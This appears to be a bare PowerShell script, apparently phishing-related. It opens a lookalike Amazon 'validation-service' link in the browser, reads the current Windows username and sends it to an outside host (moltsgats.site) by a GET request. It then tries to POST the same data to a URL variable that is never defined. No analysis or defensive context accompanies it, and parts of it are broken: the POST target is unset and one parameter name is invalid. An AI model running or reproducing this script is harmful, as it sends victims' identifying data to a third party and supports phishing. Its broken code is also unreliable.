Start-Process "https://amazon.validation-service.salleurl.nl/etic"
#
$username = $env:USERNAME
#
$getUrl = "https://moltsgats.site/sendsal2025?$username"
Invoke-RestMethod -Uri $getUrl -Method Get -UseBasicPipelining
#
$jsonPayload = @{
    username = $username
} | ConvertTo-Json
Invoke-RestMethod -Uri $postUrl -Method Post -Body $jsonPayload -ContentType "application/json"
